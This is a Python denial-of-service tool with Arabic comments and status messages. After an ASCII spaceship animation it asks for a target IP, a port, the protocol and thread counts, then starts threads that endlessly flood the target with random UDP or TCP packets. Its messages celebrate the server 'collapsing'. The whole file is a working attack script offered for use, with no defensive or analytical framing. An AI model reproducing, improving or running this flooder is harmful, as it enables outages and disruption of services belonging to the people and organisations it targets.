import os
import time
import random
import socket
import threading
import platform
from colorama import init, Fore

# تفعيل الألوان
init(autoreset=True)

# شكل السفينة الفضائية (ASCII)
spaceship = [
    "      /\\",
    "     /  \\",
    "    /____\\",
    "   |      |",
    "   | NASA |",
    "   |      |",
    "  /|______|\\",
    " /_/______\\_\\"
]

colors = [Fore.RED, Fore.GREEN, Fore.CYAN, Fore.MAGENTA, Fore.YELLOW]

# عرض أنميشن فضائي قبل الهجوم
def animate_spaceship():
    width = os.get_terminal_size().columns
    for _ in range(10):
        os.system('cls' if os.name == 'nt' else 'clear')
        indent = random.randint(0, max(0, width - 20))
        color = random.choice(colors)
        for line in spaceship:
            print(" " * indent + color + line)
        time.sleep(0.25)

animate_spaceship()

# بدء تنفيذ الهجوم
print(Fore.YELLOW + "\n[+] نظام التشغيل: " + platform.system())
ip = str(input(Fore.CYAN + "Server IP         : "))
port = int(input("Port              : "))
choice = str(input("Use UDP (y/n)     : "))
times = int(input("Packets/Thread    : "))
threads = int(input("Threads           : "))

# رسائل عشوائية غير مكررة
messages = [
    "[+] المجرة تشتعل...",
    "[*] إشارات مشوشة تُرسل...",
    "[×] اختراق في الزمن...",
    "[!] هجوم موجات كونية...",
    "[#] السيرفر يصرخ..."
]
last_msg = None
def get_unique_message():
    global last_msg
    msg = random.choice(messages)
    while msg == last_msg:
        msg = random.choice(messages)
    last_msg = msg
    return msg

# UDP
def run_udp():
    data = random._urandom(1024)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for _ in range(times):
                s.sendto(data, addr)
            print(Fore.MAGENTA + get_unique_message())
        except:
            print(Fore.RED + "[!] السيرفر انهار (UDP)!")

# TCP
def run_tcp():
    data = random._urandom(512)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for _ in range(times):
                s.send(data)
            print(Fore.CYAN + get_unique_message())
        except:
            s.close()
            print(Fore.RED + "[!] السيرفر انهار (TCP)!")

# بدء الخيوط
for _ in range(threads):
    th = threading.Thread(target=run_udp if choice.lower() == 'y' else run_tcp)
    th.start()